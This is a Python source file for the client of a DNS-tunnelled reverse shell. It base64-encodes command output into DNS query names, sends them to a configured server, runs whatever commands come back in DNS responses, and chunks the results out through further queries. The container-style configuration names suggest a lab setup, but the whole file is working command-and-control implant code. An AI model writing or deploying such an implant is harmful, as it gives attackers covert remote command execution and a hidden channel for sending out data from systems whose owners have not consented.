import dnslib
import socket
import base64
from subprocess import getstatusoutput
from sys import exit
from dotenv import dotenv_values

config = dotenv_values()

def run(dns_server, domain_name):

    shell_output = getstatusoutput(cmd=b"hostname")
    cmd_code = shell_output[0]
    cmd_response = bytes(shell_output[1] + "\n", encoding="ascii")

    encoded_shell_output = base64.b64encode(cmd_response).decode("ascii")
    question = encoded_shell_output + "." + domain_name
    start_query = dnslib.DNSRecord.question(qname=question, qtype="A")

    dns_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    dns_socket.sendto(start_query.pack(), (dns_server, int(config["DNSSERVER_CONTAINER_PORT"])))

    while True:
        response = dnslib.DNSRecord.parse(dns_socket.recv(4096))
        rname = str(response.rr[0].rname)
        rname = rname.split(".")
        response_msg = rname[0]
        command = base64.b64decode(response_msg).decode("ascii")

        shell_output = getstatusoutput(cmd=command)
        cmd_code = shell_output[0]
        cmd_response = bytes(shell_output[1] + "\n", encoding="ascii")

        if command == "exit":
            cmd_response = b"To exit, use CTRL+C.\n"
        if command == "continue":
            continue
        if cmd_code != 0:
            cmd_response = bytes(f"Received an non-zero exit code of {cmd_code}\n", encoding="ascii")
        encoded_shell_output = base64.b64encode(cmd_response).decode("ascii")

        question = encoded_shell_output + "." + domain_name
        
        if len(question) > 64:
            suffix_len = len("." + domain_name)
            prefix_len = int((64 - suffix_len) / 2)
            for i in range(0, len(cmd_response), prefix_len):
                encoded_shell_output = base64.b64encode(cmd_response[i:i+prefix_len]).decode("ascii")
                question = encoded_shell_output + "." + domain_name
                query = dnslib.DNSRecord.question(qname=question, qtype="A")
                dns_socket.sendto(query.pack(), (dns_server, int(config["DNSSERVER_CONTAINER_PORT"])))
        else:
            query = dnslib.DNSRecord.question(qname=question, qtype="A")
            dns_socket.sendto(query.pack(), (dns_server, int(config["DNSSERVER_CONTAINER_PORT"])))

if __name__ == "__main__":
    try:
        run(dns_server=config["DNSSERVER_CONTAINER_HOSTNAME"], domain_name=config["DOMAIN_NAME"])
    except KeyboardInterrupt:
        print("\nDetected CTRL+C. Exiting now.")
        exit(0)